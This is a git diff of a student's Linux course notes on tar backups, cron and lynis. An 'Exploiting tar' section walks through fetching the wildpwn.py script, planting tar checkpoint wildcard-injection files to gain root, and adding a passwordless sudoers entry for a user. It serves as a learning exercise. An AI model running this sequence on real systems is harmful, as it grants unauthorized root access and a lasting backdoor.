@@ -7,7 +7,7 @@ I am writing this readme to reinforce and document things I leant during the Uni
 ## Random Usefulthings
 
 - `ls -l admit discharge` displays the files inside and the permissions of the folders
-
+- `ls -lat` here lat are instructions where `l` list of files, `a` displays entries starting with `.` means also shows hidden files and folders and `t` Sort by time modified. 
 
 ## `tar` for full and incremental backup
 
@@ -108,8 +108,142 @@ The testenvir folder contains the folder called patient. Then I have initially b
 - Archiving
 `tar cvvWf epscript_back_sun.tar --listed-incremental=epscript_backup.snar --level=0 testenvir`
 
-- Simulating an attack by removing only one folder
+
+- Simulating an attack by removing only one folder - doing this while being inside epscript that contains the tar file as well as the original
 `rm -r testenvir/patient/`
 
-- Replacing that specific folder only
+                - Check that the patient folder is gone
+            
+                 `ls -l testenvir`
+
+- Extracting/Replacing that specific folder only- inthis case the patient folder inside the original testenvir
 `tar xvvf epscript_back_sun.tar -R -C ~/Documents/epscript/ testenvir/patient/`
+
+                      `ls -l testenvir`
+                - Now you will see that the folder has reappeared
+
+- Baking up data of user1
+
+ - `tar cvvWf backup.tar --listed-incremental=backup.snar --level 0 archive/home/user1`
+
+ - Then I am changing the files. In the patient folder of the testenvir folder I have created more files called patient.0a and patient.0b
+
+ - Creating a new Monday backup
+
+- `tar cvvWf epscript_back_mon.tar --listed-incremental=epscript_backup.snar testenvir`
+
+- Checking that the new files were backed up - the command below will list the files in the 
+
+`tar tvvf epscript_back_mon.tar --incremental | less`
+
+- Note the **Y**, **N**, **D** markings of the files. Y are the new files that are archived even in the incremental backup file. The N are the files in the main old backup that were not changed and hence not saved in the incremental backup either and D indicates that the file is a directory. If only one file changes in a directory, the entire directory is backed up again
+
+
+## Exploiting `tar`
+
+- Create a new folder exploitar. It should be in the same folder that will be archived
+    - `wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py`
+    - `ls -lat` this mill show the hidden files as well as display as modified by time
+- Run the python script
+
+- `python wildpwn.py tar .` Running the python script. This . is important
+- `ls -lat` `cd .cache` `ls -lat` in sequence
+- `./.cachefile` running the .cachefile. Running this malacious script you can switch to the root user
+- `visudo` to add jane to sudoers and eliminate the need for pw - that way you do not have to steal the password. `jane   ALL=(ALL) NOPASSWD:ALL`
+- `su jane`
+- `sudo -l` you cna open shadow file, if so then you have successfully converted Jane to a super user
+
+### Archiving all the files and folders in the current directory
+
+- `tar cvf backuptarfilename.tar ./*`
+
+However this command is dangerous as it has loopholes for the hackers to exmploit. 
+**Usig the Checkpoints** 
+
+- Usually done to keep in check the disk space
+
+- `--checkpoint=1000` and  `--checkpoint-action=du`
+
+- The general syntax of checkpoint commands:
+
+    - `--checkpoint=[n]` 
+
+    - `--checkpoint-action=[ACTION]`
+
+    **Arbitrary Command execution** or **ACE** Vulnerabilities
+    
+    - Hackers can exploit to tar command to plant malacious code and gain root privilidges
+
+
+
+**Running a python script**
+
+`python wildpwn.py tar`
+
+
+
+
+    ## Cron Command for automation of Tasks
+
+    - `crontab -l`
+    - `crontab -e`
+    - `systemctl status cron`
+    - `m h  dom mon dow   command`  as _minute_, _hour_, _day of month_, _month of year_, and _day of week_
+
+ - `0 23 * * 6     rm ~/Downloads/*`
+ 
+- Minutes are specified with 0-59.
+
+- Hours are specified with 0-23, with 0 being midnight.
+
+- Day of month is specified with 0-31, or however many days are in that month.
+
+- Month of year is specified with 1-12, with 1 being January.
+
+- Day of week is specified with 0-7, with 0 and 7 being Sunday, 1 being Monday, and so forth.
+
+   - Some systems allow you to use three-letter abbreviations as well, such as `SAT` or `MON`. When in doubt, use numbers, which are universally understood.
+
+- In a crontab, the `*` character means "every." For example, `*` in the day value means "every day."
+
+[Crontab Generator](https://crontab-generator.org)
+[crontab.guru](https://crontab.guru)
+
+  - `0 6 * * 1-5     rm ~/Downloads/*`
+
+
+  - Use the following settings for this example: `0 6 * * 1-5`.
+
+  - Point out that this translates to **at 6AM sharp, every week, every month, (Mon - Fri)**.
+
+   - `sudo ls /var/spool/cron/crontabs`
+    - `sudo tail /var/spool/cron/crontabs/instructor`
+
+    `sudo crontab -l` running crontab as root
+
+## Making scripts
+
+- `nano cleanup_downloads.sh`
+
+- `chmod +x cleanup_downloads.sh` Giving execuatable properties to the bash script
+
+ - `sudo ./cleanup_downloads.sh` executing the script after navigating to the directory where it is located
+
+
+ ## user cron tabs vs system-wide cron directories
+
+ - `less /etc/crontab` Inspecting crontab script
+
+ - `/etc/cron.d`  This stores scripts that are run are run at custom times
+
+- `/etc/cron.daily`
+
+- `/etc/cron.weekly`
+
+- `/etc/cron.monthly`
+
+
+## Automating the running of the system scans
+
+- `sudo lynis show groups` listing scans run by lynis
+- `sudo lynis show help`
